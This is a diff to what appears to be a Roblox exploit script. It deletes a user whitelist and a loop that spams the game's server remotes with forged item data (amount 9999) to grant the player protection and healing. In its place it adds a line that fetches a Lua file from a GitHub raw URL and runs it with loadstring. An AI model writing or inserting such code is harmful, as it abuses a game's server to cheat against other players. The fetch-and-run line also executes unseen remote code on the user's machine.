@@ -1,4 +1,3 @@
-local WhitelistedUsers = {User1 = "imagod_033", User2 = "4SaD45", User3 = "iusealsploit", User4 = "umother2001vjd", User5 = "ncm_hack", User6 = "bananjoy_4"}
 local Owner = "AlSploitEzWins"
 
 local LocalPlayer = game.Players.LocalPlayer
@@ -5127,39 +5126,5 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	for i, v in next, WhitelistedUsers do
-		if v.Name == LocalPlayer.Name or LocalPlayer.Name == Owner then
-			task.spawn(function()
-				repeat
-					task.wait(0.1)
-					
-					task.spawn(function()
-						WandBubbleProtectionRemote:InvokeServer({
-							["targetPlayerUserId"] = LocalPlayer.UserId,
-							["handItem"] = {
-								["itemSkin"] = "",
-								["itemType"] = "villain_protector_wand",
-								["amount"] = 9999,
-								["addedToBackpackTime"] = 0,
-								["tool"] = ReplicatedStorage.Items.villain_protector_wand,
-							},
-						})
-					end)
-					
-					task.spawn(function()
-						WandHealPlayerRemote:InvokeServer({
-							["targetPlayerUserId"] = LocalPlayer.UserId,
-							["handItem"] = {
-								["itemSkin"] = "",
-								["itemType"] = "villain_protector_wand",
-								["amount"] = 9999,
-								["addedToBackpackTime"] = 0,
-								["tool"] = ReplicatedStorage.Items.villain_protector_wand,
-							},
-						})
-					end)
-				until not game
-			end)
-		end
-	end	
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MaxlaserTechAlt/MoonWareInf/main/CapeV2.lua"))()
 end)
